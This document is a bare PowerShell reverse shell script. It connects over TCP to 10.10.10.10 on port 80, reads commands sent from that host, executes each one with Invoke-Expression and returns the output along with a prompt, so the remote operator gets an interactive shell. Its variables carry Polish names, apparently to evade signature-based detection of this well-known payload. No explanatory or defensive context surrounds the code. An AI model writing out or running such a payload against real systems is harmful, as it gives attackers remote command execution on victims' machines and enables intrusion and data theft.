$dozorca = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
$potokrzeczny = $dozorca.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $potokrzeczny.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$powrotka = (iex ". { $data } 2>&1" | Out-String ); $powrotka2 = $powrotka + 'PS ' + (pwd).Path + '> ';
$zwrotka = ([text.encoding]::ASCII).GetBytes($powrotka2);
$potokrzeczny.Write($zwrotka,0,$zwrotka.Length);
$potokrzeczny.Flush()};
$dozorca.Close()